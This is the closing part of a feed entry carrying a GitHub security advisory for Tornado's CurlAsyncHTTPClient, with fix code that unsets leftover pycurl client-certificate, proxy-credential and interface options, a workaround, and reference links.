<pre><code class="language-python"># client certificate
if request.client_cert is not None:
    curl.setopt(pycurl.SSLCERT, request.client_cert)
else:
    curl.unsetopt(pycurl.SSLCERT)
if request.client_key is not None:
    curl.setopt(pycurl.SSLKEY, request.client_key)
else:
    curl.unsetopt(pycurl.SSLKEY)

# proxy credentials (inside the `if request.proxy_host and request.proxy_port:` branch)
if request.proxy_username:
    ...
    curl.setopt(pycurl.PROXYUSERPWD, credentials)
else:
    curl.unsetopt(pycurl.PROXYUSERPWD)

# network interface
if request.network_interface:
    curl.setopt(pycurl.INTERFACE, request.network_interface)
else:
    curl.unsetopt(pycurl.INTERFACE)
</code></pre>
<p>Until a fix is available, use a separate <code>CurlAsyncHTTPClient</code> instance per
distinct credential set (per client certificate / per proxy credential), or use
<code>SimpleAsyncHTTPClient</code> where applicable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tornadoweb/tornado/security/advisories/GHSA-pw6j-qg29-8w7f">https://github.com/tornadoweb/tornado/security/advisories/GHSA-pw6j-qg29-8w7f</a></li>
<li><a href="https://github.com/advisories/GHSA-pw6j-qg29-8w7f">https://github.com/advisories/GHSA-pw6j-qg29-8w7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pw6j-qg29-8w7f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T20:37:24.000Z</published>
    </entry>
</feed>